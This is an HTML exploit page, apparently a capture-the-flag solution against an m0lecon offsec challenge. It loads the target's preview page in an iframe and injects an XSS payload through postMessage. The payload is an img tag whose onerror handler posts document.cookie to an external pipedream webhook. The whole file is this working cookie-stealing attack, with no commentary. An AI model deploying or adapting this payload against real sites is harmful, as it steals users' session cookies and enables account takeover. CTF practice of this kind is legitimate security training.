<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://b39ea9bd-a48a-4d7a-a07e-3339eddff0bd.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const payload = `<img src=x onerror="
              (async function() {
                var WEBHOOK = '${WEBHOOK}';
                
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
                  keepalive: true,
                  body: JSON.stringify(document.cookie)
                });
              })();
            ">`;

            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
